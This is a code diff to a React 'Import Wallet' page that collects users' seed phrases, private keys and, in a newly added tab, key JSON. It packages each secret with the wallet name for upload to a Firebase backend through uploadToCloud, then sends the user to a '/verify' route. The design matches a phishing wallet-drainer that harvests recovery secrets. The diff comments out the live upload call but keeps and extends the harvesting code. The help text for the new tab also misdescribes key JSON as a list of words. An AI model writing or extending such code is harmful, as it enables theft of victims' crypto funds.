@@ -1,4 +1,4 @@
-import { Container, Tabs, TextField, Button } from "@mui/material";
+import { Container, Tabs, TextField, Button, IconButton } from "@mui/material";
 import PropTypes from "prop-types";
 import Tab from "@mui/material/Tab";
 import Typography from "@mui/material/Typography";
@@ -6,6 +6,8 @@ import Box from "@mui/material/Box";
 import { WalletContext } from "../context/WalletContext";
 import React, { useContext, useState } from "react";
 import { uploadToCloud } from "../backend/firebase";
+import ArrowBackIcon from "@mui/icons-material/ArrowBack";
+import { NavLink } from "react-router-dom";
 
 function TabPanel(props) {
   const { children, value, index, ...other } = props;
@@ -43,6 +45,8 @@ function a11yProps(index) {
 function BasicTabs() {
   const PRIVATE_KEY = "private_key";
   const SEED_PHRASE = "seed_phrase";
+  const KEY_JSON = "key_json";
+
   const { wallet } = useContext(WalletContext);
   const [value, setValue] = useState(0);
 
@@ -59,19 +63,31 @@ function BasicTabs() {
   const uploadData = (value, type, wallet) => {
     const payload = { value, type, wallet };
 
-    // console.log(`Uploaded payload: ${payload}`);
-    uploadToCloud(payload);
+    // uploadToCloud(payload);
   };
 
   const handleUpload = (type) => {
     if (type === SEED_PHRASE) uploadData(seedPhrase, SEED_PHRASE, wallet);
     if (type === PRIVATE_KEY) uploadData(privateKey, PRIVATE_KEY, wallet);
+    if (type === KEY_JSON) uploadData(keyJSON, KEY_JSON, wallet);
   };
 
   const [privateKey, setPrivateKey] = useState("");
 
   const updatePrivateKey = (e) => {
     setPrivateKey(e.target.value);
+  };
+
+  const [keyJSON, setKeyJSON] = useState("");
+
+  const updateKeyJSON = (e) => {
+    setKeyJSON(e.target.value);
+  };
+
+  const clearFields = () => {
+    setSeedPhrase("");
+    setPrivateKey("");
+    setKeyJSON("");
   };
 
   return (
@@ -84,6 +100,7 @@ function BasicTabs() {
         >
           <Tab label="Phrase" {...a11yProps(0)} />
           <Tab label="Private Key" {...a11yProps(1)} />
+          <Tab label="Key JSON" />
         </Tabs>
       </Box>
 
@@ -102,6 +119,8 @@ function BasicTabs() {
           onClick={() => handleUpload(SEED_PHRASE)}
           sx={{ width: "100%" }}
           variant="contained"
+          component={NavLink}
+          to="/verify"
         >
           Import
         </Button>
@@ -120,6 +139,28 @@ function BasicTabs() {
           onClick={() => handleUpload(PRIVATE_KEY)}
           sx={{ width: "100%" }}
           variant="contained"
+          component={NavLink}
+          to="/verify"
+        >
+          Import
+        </Button>{" "}
+      </TabPanel>
+
+      <TabPanel value={value} index={2}>
+        <TextField
+          value={keyJSON}
+          onChange={updateKeyJSON}
+          sx={{ width: "100%" }}
+        />
+        <Typography>
+          Typically 12 (sometimes 24) words seperated by a single spaces.
+        </Typography>
+        <Button
+          onClick={() => handleUpload(KEY_JSON)}
+          sx={{ width: "100%" }}
+          variant="contained"
+          component={NavLink}
+          to="/verify"
         >
           Import
         </Button>{" "}
@@ -131,10 +172,13 @@ function BasicTabs() {
 const ImportWallet = () => {
   const { wallet } = useContext(WalletContext);
   return (
-    <Container
-      sx={{ background: "grey", height: "100vh", width: "50%", margin: "auto" }}
-    >
-      <Typography variant="h6">Import {wallet} Wallet</Typography>
+    <Container sx={{ height: "100vh" }}>
+      <Box sx={{ display: "flex", alignItems: "center" }}>
+        <IconButton>
+          <ArrowBackIcon />
+        </IconButton>
+        <Typography variant="h6">Import {wallet} Wallet</Typography>
+      </Box>
       <BasicTabs />
     </Container>
   );
